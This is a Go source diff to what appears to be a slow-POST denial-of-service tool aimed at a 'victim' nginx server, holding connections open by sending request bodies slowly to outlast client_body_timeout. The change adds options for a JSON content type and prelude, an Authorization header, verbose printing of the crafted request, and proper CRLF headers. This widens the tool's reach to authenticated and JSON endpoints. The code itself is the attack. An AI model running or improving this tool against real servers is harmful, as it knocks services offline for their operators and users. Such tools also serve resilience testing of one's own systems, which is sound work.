@@ -25,7 +25,10 @@ var (
 	sleepInterval    = flag.Duration("sleepInterval", 10*time.Second, "Sleep interval between subsequent packets sending. Adjust to nginx's client_body_timeout")
 	testDuration     = flag.Duration("testDuration", time.Hour, "Test duration")
 	victimUrl        = flag.String("victimUrl", "http://127.0.0.1/", "Victim's url. Http POST must be allowed in nginx config for this url")
-	hostHeader        = flag.String("hostHeader", "", "Host header value in case it is different than the hostname in victimUrl")
+    jsonify          = flag.Bool("jsonify", false, "append a JSON prelude to the request")
+    authorization    = flag.String("authorization", "", "Authorization header to pass")
+	hostHeader       = flag.String("hostHeader", "", "Host header value in case it is different than the hostname in victimUrl")
+    verbose          = flag.Bool("verbose", false, "print the constructed request")
 )
 
 var (
@@ -49,6 +52,7 @@ func main() {
 	if err != nil {
 		log.Fatalf("Cannot parse victimUrl=[%s]: [%s]\n", victimUrl, err)
 	}
+
 	victimHostPort := victimUri.Host
 	if !strings.Contains(victimHostPort, ":") {
 		port := "80"
@@ -57,12 +61,30 @@ func main() {
 		}
 		victimHostPort = net.JoinHostPort(victimHostPort, port)
 	}
+
 	host := victimUri.Host
 	if len(*hostHeader) > 0 {
 		host = *hostHeader
 	}
-	requestHeader := []byte(fmt.Sprintf("POST %s HTTP/1.1\nHost: %s\nContent-Type: application/x-www-form-urlencoded\nContent-Length: %d\n\n",
-		victimUri.RequestURI(), host, *contentLength))
+
+    contentType := "application/x-www-form-urlencoded"
+    jsonPrelude := ""
+    if *jsonify {
+        contentType = "application/json"
+        jsonPrelude = "{\""
+    }
+
+    authHeader := ""
+    if len(*authorization) > 0 {
+        authHeader = fmt.Sprintf("Authorization: %s\r\n", *authorization)
+    }
+
+	requestHeader := []byte(fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nContent-Type: %s\r\n%sContent-Length: %d\r\n\r\n%s",
+		victimUri.RequestURI(), host, contentType, authHeader, *contentLength, jsonPrelude))
+
+    if *verbose {
+        fmt.Println(string(requestHeader))
+    }
 
 	dialWorkersLaunchInterval := *rampUpInterval / time.Duration(*dialWorkersCount)
 	activeConnectionsCh := make(chan int, *dialWorkersCount)
